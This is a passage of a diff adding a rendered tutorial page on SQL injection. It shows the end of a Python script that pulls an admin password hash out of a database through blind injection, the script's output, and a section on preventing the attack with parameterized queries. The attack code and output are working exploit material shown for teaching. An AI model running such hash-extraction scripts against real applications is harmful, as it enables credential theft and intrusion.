+					<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Dialing hash ... </span><span class="si">{pwdhash}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">pwdhash</span><span class="o">=</span><span class="n">pwdhash</span><span class="p">),</span> <span class="n">sep</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s1">&#39;</span><span class="se">\r</span><span class="s1">&#39;</span><span class="p">)</span>
+					<span class="k">break</span>
+			<span class="c1"># If the character isn&#39;t 0-9 or a-e, it must be &#39;f&#39;:</span>
+			<span class="k">else</span><span class="p">:</span>
+				<span class="n">pwdhash</span> <span class="o">+=</span> <span class="s1">&#39;f&#39;</span>
+				<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Dialing hash ... </span><span class="si">{pwdhash}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">pwdhash</span><span class="o">=</span><span class="n">pwdhash</span><span class="p">),</span> <span class="n">sep</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s1">&#39;</span><span class="se">\r</span><span class="s1">&#39;</span><span class="p">)</span>
+
+
+	<span class="nb">print</span><span class="p">()</span>
+	<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Extracted Hash: &#39;</span><span class="si">{pwdhash}</span><span class="s2">&#39;&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">pwdhash</span><span class="o">=</span><span class="n">pwdhash</span><span class="p">))</span>
+
+<span class="c1"># Execute the attack function:</span>
+<span class="n">start</span> <span class="o">=</span> <span class="n">timer</span><span class="p">()</span>
+<span class="k">await</span> <span class="n">attack</span><span class="p">()</span>
+<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">Time elapsed: </span><span class="si">{time}</span><span class="s1"> seconds&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">time</span><span class="o">=</span><span class="n">timer</span><span class="p">()</span> <span class="o">-</span> <span class="n">start</span><span class="p">))</span>
+<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Total requests sent: </span><span class="si">{total}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">total</span><span class="o">=</span><span class="n">total_requests</span><span class="p">))</span>
+</pre></div>
+</div>
+</div>
+<div class="cell_output docutils container">
+<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>Dialing hash ... 1a1dc91c907325c69271ddf0c944bc72
+Extracted Hash: &#39;1a1dc91c907325c69271ddf0c944bc72&#39;
+
+Time elapsed: 7.059224237003946 seconds
+Total requests sent: 255
+</pre></div>
+</div>
+</div>
+</div>
+<p>And just like that, in just a few short seconds, we’ve managed to steal the <code class="docutils literal notranslate"><span class="pre">admin</span></code> user’s password hash from the database.
+Now, this attack does leave a <strong>much</strong> larger footprint (nearly 260 distinct HTTP requests),
+which might tip-off the server owner to the attack, but probably not before you’re able to crack their password
+and infultrate the application.</p>
+</div>
+<div class="section" id="avoiding-sql-injection">
+<h2>Avoiding SQL Injection<a class="headerlink" href="#avoiding-sql-injection" title="Permalink to this headline">¶</a></h2>
+<p>As the application developer, it is always important to ensure you read the documentation on the tools you use,
+and make sure you understand how they are intended to be used.
+In the case of the <a class="reference external" href="https://node-postgres.com"><code class="docutils literal notranslate"><span class="pre">pg</span></code> package</a>, the very first page of documentation explains how to
+safely pass varibles to SQL queries:</p>
+<div class="highlight-js notranslate"><div class="highlight"><pre><span></span><span class="c1">// Check the database for a user with the same username and password hash:</span>
+<span class="nx">db</span><span class="p">.</span><span class="nx">query</span><span class="p">(</span><span class="s2">&quot;SELECT * FROM users WHERE username=$1 AND pwdhash=$2&quot;</span><span class="p">,</span> <span class="p">[</span> <span class="nx">req</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">user</span><span class="p">,</span> <span class="nx">hash</span> <span class="p">],</span> <span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">users</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+	<span class="c1">// ...</span>
+<span class="p">});</span>
+</pre></div>
+</div>
+<p>Just like that, our application is no longer vulnerable to these attacks.
+That said, it’s still vulnerable to a whole slew of other kinds of attacks.</p>
+</div>
+</div>
+
+    <script type="text/x-thebe-config">
+    {
+        requestKernel: true,
+        binderOptions: {
+            repo: "binder-examples/jupyter-stacks-datascience",
+            ref: "master",
+        },
+        codeMirrorConfig: {
+            theme: "abcdef",
+            mode: "python"
+        },
+        kernelOptions: {
+            kernelName: "python3",
+            path: "./appendix/cyber-security"
+        },
+        predefinedOutput: true
+    }
+    </script>
+    <script>kernelName = 'python3'</script>
+
+              </div>
+              
+        
+            <!-- Previous / next buttons -->
+<div class='prev-next-area'>
+</div>
+        
+        </div>
+    </div>
+    <footer class="footer">
+    <div class="container">
+      <p>
+        
+          By Buckley Ross<br/>
+        
+            &copy; Copyright 2021.<br/>
+          <div class="extra_footer">
+            <center>
+Permission is granted to copy, distribute and/or modify this<br/>
+document under the terms of the GNU Free Documentation License,<br/>
+Version 1.3 or any later version published by the Free Software<br/>
+Foundation; with no Invariant Sections, no Front-Cover Texts, and<br/>
+no Back-Cover Texts.  A copy of the license is included in the<br/>
+section entitled "GNU Free Documentation License".
+</center>
+
+          </div>
+      </p>
+    </div>
+  </footer>
+</main>
+
+
+      </div>
+    </div>
+  
+  <script src="../../_static/js/index.be7d3bbb2ef33a8344ce.js"></script>
+
+  </body>
+</html>
